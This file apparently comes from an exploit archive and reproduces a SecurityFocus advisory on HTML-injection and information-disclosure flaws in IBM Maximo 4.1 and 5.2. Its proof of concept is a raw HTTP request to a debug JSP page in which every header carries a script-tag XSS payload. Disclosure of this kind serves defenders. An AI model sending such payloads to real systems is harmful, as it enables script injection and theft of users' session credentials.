@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/30180/info
+
+IBM Maximo is prone to multiple HTML-injection vulnerabilities and an information-disclosure vulnerability.
+
+An attacker may leverage these issues to obtain potentially sensitive information and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. Code execution may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. Information obtained may aid in further attacks.
+
+These issues affect IBM Maximo 4.1 and 5.2; other versions may also be vulnerable. 
+
+GET /jsp/common/system/debug.jsp HTTP/1.1
+Accept: <script>alert('XSS');</script>
+Accept-Language: <script>alert('XSS');</script>
+UA-CPU: <script>alert('XSS');</script>
+Accept-Encoding: <script>alert('XSS');</script>
+User-Agent: <script>alert('XSS');</script>
+Host: maximo
+Connection: Keep-Alive
+Cookie: <script>alert('XSS');</script> 
